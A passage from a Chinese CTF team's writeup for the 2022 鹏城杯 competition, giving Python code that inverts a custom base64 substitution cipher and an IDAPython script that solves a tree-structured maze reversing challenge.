<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Maps = bytearray(b&#x27;XiIzDuAoGlaK6JcjM3g/9YQmHBOsxn1hLZ4w7Tt0PV5pNqUFC+rE2dSfyvWe8kRb=&#x27;)</span><br><span class="line">sbox = [0x33, 0x34, 0x2C, 0x36, 0x1D, 0x12, 0x1E, 0x0C, 0x1A, 0x3C, 0x29, 0x10, 0x20, 0x14, 0x3D, 0x3B, 0x19, 0x08, 0x0E, 0x1F, 0x30, 0x05, 0x38, 0x03, 0x11, 0x1B, 0x17, 0x21, 0x2E, 0x04, 0x18, 0x23, 0x2B, 0x02, 0x27, 0x37, 0x1C, 0x24, 0x39, 0x3F, 0x35, 0x2D, 0x26, 0x13, 0x2A, 0x0A, 0x00, 0x07, 0x3E, 0x01, 0x28, 0x2F, 0x32, 0x22, 0x0D, 0x06, 0x25, 0x3A, 0x09, 0x0F, 0x16, 0x0B, 0x15, 0x31, 0x0C, 0x2C, 0x0D, 0x21, 0x22, 0x09, 0x02, 0x39, 0x31, 0x17, 0x1A, 0x33, 0x06, 0x24, 0x10, 0x04, 0x1B, 0x0B, 0x34, 0x12, 0x38, 0x27, 0x0E, 0x20, 0x2B, 0x2E, 0x00, 0x13, 0x3E, 0x3A, 0x05, 0x1E, 0x36, 0x08, 0x32, 0x29, 0x19, 0x23, 0x3D, 0x3B, 0x3C, 0x3F, 0x37, 0x30, 0x18, 0x16, 0x35, 0x25, 0x0A, 0x2D, 0x28, 0x26, 0x15, 0x11, 0x07, 0x1D, 0x2A, 0x0F, 0x1F, 0x14, 0x01, 0x1C, 0x03, 0x2F, 0x13, 0x0D, 0x35, 0x31, 0x07, 0x11, 0x1B, 0x23, 0x0B, 0x0C, 0x10, 0x25, 0x2B, 0x21, 0x33, 0x18, 0x27, 0x29, 0x02, 0x2F, 0x28, 0x30, 0x0E, 0x19, 0x3C, 0x08, 0x34, 0x20, 0x3D, 0x2E, 0x05, 0x15, 0x2C, 0x1C, 0x36, 0x22, 0x1E, 0x24, 0x38, 0x0A, 0x3F, 0x1A, 0x04, 0x26, 0x16, 0x2A, 0x3A, 0x1F, 0x2D, 0x32, 0x06, 0x37, 0x03, 0x3B, 0x00, 0x17, 0x1D, 0x12, 0x09, 0x01, 0x3E, 0x39, 0x0F, 0x14, 0x00, 0x00, 0x00, 0x3F, 0xFB, 0x7F, 0x00, 0x00, 0x04, 0x01, 0x00, 0x00, 0xFB, 0x7F, 0x00, 0x00, 0x6B, 0x73, 0x50, 0x68, 0x53, 0x2F, 0x33, 0x34, 0x4D, 0x58, 0x69, 0x66, 0x6A, 0x2B, 0x49, 0x62, 0x74, 0x6A, 0x75, 0x64, 0x32, 0x54, 0x69, 0x6B, 0x6A, 0x35, 0x48, 0x6B, 0x41, 0x37, 0x69, 0x54, 0x70, 0x62, 0x61, 0x4E, 0x45, 0x4C, 0x42, 0x65, 0x62, 0x4F, 0x61, 0x49, 0x6D, 0x00, 0x00, 0x00]</span><br></pre></td></tr></table></figure>

<p>base64之后的加密</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">box1 = sbox[0:64]</span><br><span class="line">box2 = sbox[64:128]</span><br><span class="line">box3 = sbox[128:192]</span><br><span class="line">idx_1, idx_2, idx_3 = sbox[192], sbox[193], sbox[194]</span><br><span class="line"></span><br><span class="line">inp = bytearray(b&quot;XzD+6/D+6/D+6/D+6/D+6/D+6/D+6/D+6/D+6/D+6/D=\x00&quot;)</span><br><span class="line">print(len(inp))</span><br><span class="line">out = bytearray([0] * 45)</span><br><span class="line"></span><br><span class="line">for j in range(9):</span><br><span class="line">    for i in range(5):</span><br><span class="line">        idx = Maps.find(inp[j*5+i])</span><br><span class="line">        if idx == -1: </span><br><span class="line">            idx = 0</span><br><span class="line">        v12 = (idx_2 + box1[(idx_1 + idx) &amp; 0x3f]) &amp; 0x3f</span><br><span class="line">        v14 = box3[(idx_3 + box2[v12]) &amp; 0x3f]</span><br><span class="line">        out[j*5+i] = Maps[v14]</span><br><span class="line">        </span><br><span class="line">        idx_1 = (idx_1 + 1) &amp; 0x3F</span><br><span class="line">print(idx_1)</span><br><span class="line">out</span><br></pre></td></tr></table></figure>

<p>逆推</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">box1 = sbox[0:64]</span><br><span class="line">box2 = sbox[64:128]</span><br><span class="line">box3 = sbox[128:192]</span><br><span class="line"></span><br><span class="line">inp = bytearray(b&quot;ksPhS/34MXifj+Ibtjud2Tikj5HkA7iTpbaNELBebOaIm&quot;)</span><br><span class="line">print(len(inp))</span><br><span class="line">out = bytearray([0] * 45)</span><br><span class="line"></span><br><span class="line">for j in range(9):</span><br><span class="line">    for i in range(5):</span><br><span class="line">        index = 44 - (j*5+i)</span><br><span class="line">        v14 = Maps.find(inp[index])</span><br><span class="line">        v12 = box2.index(box3.index(v14))</span><br><span class="line">        idx = (box1.index(v12) - index) &amp; 0x3f</span><br><span class="line"></span><br><span class="line">        out[index] = Maps[idx]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">out</span><br></pre></td></tr></table></figure>

<p>table replace之后decode</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">baseMaps = <span class="string">b&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span></span><br><span class="line">newMaps = <span class="string">b&quot;XiIzDuAoGlaK6JcjM3g/9YQmHBOsxn1hLZ4w7Tt0PV5pNqUFC+rE2dSfyvWe8kRb=&quot;</span></span><br><span class="line">out = <span class="string">b&#x27;cAJ7BzX+6zHrHwnTc/i7Bz6f6t6EBQDvc/xfHt9d6S9=&#x27;</span></span><br><span class="line"></span><br><span class="line">btext = out.translate(out.maketrans(newMaps, baseMaps))</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(btext).decode())</span><br></pre></td></tr></table></figure>

<h3><span id="maze">maze</span><a href="#maze" class="header-anchor"></a></h3><p>简单dfs</p>
<p>import structure</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">typedef struct TreeNode &#123;</span><br><span class="line">    struct TreeNode* parant;</span><br><span class="line">    struct TreeNode* left;</span><br><span class="line">    struct TreeNode* right;</span><br><span class="line">    _BYTE arg0;</span><br><span class="line">    _BYTE arg1;</span><br><span class="line">    _BYTE arg2;</span><br><span class="line">    _BYTE pass_flag;</span><br><span class="line">    _DWORD padding;</span><br><span class="line">    </span><br><span class="line">&#125; Node;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">    char parent[3];</span><br><span class="line">    char child[18];</span><br><span class="line">&#125; Map1;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">    char parent[3];</span><br><span class="line">    char child[24];</span><br><span class="line">&#125; Map2;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">    char parent[3];</span><br><span class="line">    char child[30];</span><br><span class="line">&#125; Map3;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">    char parent[3];</span><br><span class="line">    char child[30];</span><br><span class="line">&#125; Map4;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">    char parent[3];</span><br><span class="line">    char child[24];</span><br><span class="line">&#125; Map5;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">    char parent[3];</span><br><span class="line">    char child[18];</span><br><span class="line">&#125; Map6;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">    Map1 maze1;</span><br><span class="line">    Map2 maze2;</span><br><span class="line">    Map3 maze3;</span><br><span class="line">    Map4 maze4;</span><br><span class="line">    Map5 maze5;</span><br><span class="line">    Map6 maze5;</span><br><span class="line">&#125; MapsArray;</span><br></pre></td></tr></table></figure>

<p>调起来整个链子create struct 拿到首末address xref逆推</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">import idaapi</span><br><span class="line">import idc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nodeSize = ida_struct.get_struc_size(ida_struct.get_struc_id(&#x27;TreeNode&#x27;))</span><br><span class="line"></span><br><span class="line">def create_struct(baddr):</span><br><span class="line">    ida_bytes.del_items(baddr, nodeSize, ida_bytes.DELIT_DELNAMES)</span><br><span class="line">    </span><br><span class="line">    return idc.create_struct(baddr, -1, &#x27;TreeNode&#x27;)</span><br><span class="line"></span><br><span class="line">class MazeNode:</span><br><span class="line">    def __init__(self, baseAddr): self.baseAddr = baseAddr</span><br><span class="line">    def addr(self): return self.baseAddr</span><br><span class="line">    def value(self): return ida_bytes.get_qword(self.baseAddr)</span><br><span class="line">    def parent(self): return MazeNode(ida_bytes.get_qword(self.baseAddr))</span><br><span class="line">    def left(self): return MazeNode(ida_bytes.get_qword(self.baseAddr + 8))</span><br><span class="line">    def right(self): return MazeNode(ida_bytes.get_qword(self.baseAddr + 16))</span><br><span class="line">    def arg0(self): return ida_bytes.get_byte(self.baseAddr + 24)</span><br><span class="line">    def arg1(self): return ida_bytes.get_byte(self.baseAddr + 25)</span><br><span class="line">    def arg2(self): return ida_bytes.get_byte(self.baseAddr + 26)</span><br><span class="line">    def pass_flag(self): return ida_bytes.get_byte(self.baseAddr + 27)</span><br><span class="line">    def padding(self): return ida_bytes.get_dword(self.baseAddr + 28)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">baseAddr = 0x00156D850</span><br><span class="line">parent = MazeNode(baseAddr)</span><br><span class="line"></span><br><span class="line">def mazeHandler(p, flag, arr):</span><br><span class="line">    addr = p.addr()</span><br><span class="line">    create_struct(addr)</span><br><span class="line">    </span><br><span class="line">    if addr == 0x0156DFA0:</span><br><span class="line">        print(&quot;find the flag: &quot;, flag)</span><br><span class="line">        return flag</span><br><span class="line">    </span><br><span class="line">    arr.append(addr)</span><br><span class="line">    for item in [i for i in DataRefsTo(addr) if i not in arr]:</span><br><span class="line">        ref = MazeNode(item)</span><br><span class="line"></span><br><span class="line">        if (ref.parent().addr() == addr and ref.arg0() != 1):</span><br><span class="line">            #print(&quot;parent&quot;, hex(addr), &quot;-&gt;&quot;, hex(item))</span><br><span class="line">            mazeHandler(ref, &#x27;l&#x27;+flag, arr.copy())</span><br><span class="line"></span><br><span class="line">        if (ref.left().addr() == addr and ref.arg1() != 1):</span><br><span class="line">            #print(&quot;left&quot;, hex(addr), &quot;-&gt;&quot;, hex(item))</span><br><span class="line">            mazeHandler(ref, &#x27;r&#x27;+flag, arr.copy())</span><br><span class="line"></span><br><span class="line">        if (ref.right().addr() == addr and ref.arg2() != 1):</span><br><span class="line">            #print(&quot;right&quot;, hex(addr), &quot;-&gt;&quot;, hex(item))</span><br><span class="line">            mazeHandler(ref, &#x27;t&#x27;+flag, arr.copy())</span><br><span class="line"></span><br><span class="line">    return </span><br><span class="line"></span><br><span class="line">mazeHandler(parent, &quot;&quot;, [])</span><br><span class="line">print(&#x27;stop&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><div class="article-licensing box"><div class="licensing-title"><p>2022 鹏城杯 SU Writeup</p><p><a href="https://team-su.github.io/posts/53642.html">https://team-su.github.io/posts/53642.html</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>SUers</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2022-07-04</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2025-07-13</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/%E9%B9%8F%E5%9F%8E%E6%9D%AF/">鹏城杯</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/posts/28616.html"><i class="level-item fas fa-chevron-left"></i><span class="level-item">2022 祥云杯 SU Writeup</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/posts/688.html"><span class="level-item">2022 ACTF SU Writeup</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><!--!--><div class="column column-right  order-3 is-sticky"><!--!--></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a><p class="is-size-7"><span>&copy; 2025 SUers</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2016</p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script type="text/javascript" id="MathJax-script" async>MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      },
      svg: {
        fontCache: 'global'
      },
      chtml: {
        matchFontHeight: false
      }
    };</script><script src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><!--!--></body></html>